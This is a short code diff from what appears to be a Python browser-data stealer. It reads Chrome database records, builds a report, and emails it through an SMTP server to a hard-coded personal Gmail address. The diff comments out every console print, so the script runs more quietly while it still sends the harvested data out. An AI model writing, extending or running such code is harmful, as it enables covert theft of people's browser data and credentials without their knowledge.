@@ -97,14 +97,14 @@ def main():
         if date_created != 86400000000 and date_created:
             date = f"Creation date: {str(get_chrome_datetime(date_created))}"
             lista.append(f"{date}\n")
-            print(date)
+            # print(date)
 
         if date_last_used != 86400000000 and date_last_used:
             lastUsed = f"Last Used: {str(get_chrome_datetime(date_last_used))}"
             lista.append(f"{lastUsed}\n\n")
-            print(lastUsed)
+            # print(lastUsed)
         lista.append("\n")
-        print("="*50)
+        # print("="*50)
 
     result = ''.join(''.join(map(str, tup)) for tup in lista)
 
@@ -118,7 +118,7 @@ def main():
                         'jeffersonssantos92@gmail.com', result.encode('utf-8'))
 
         server.quit()
-    print(result)
+    # print(result)
     enviaInformacao()
     cursor.close()
     db.close()
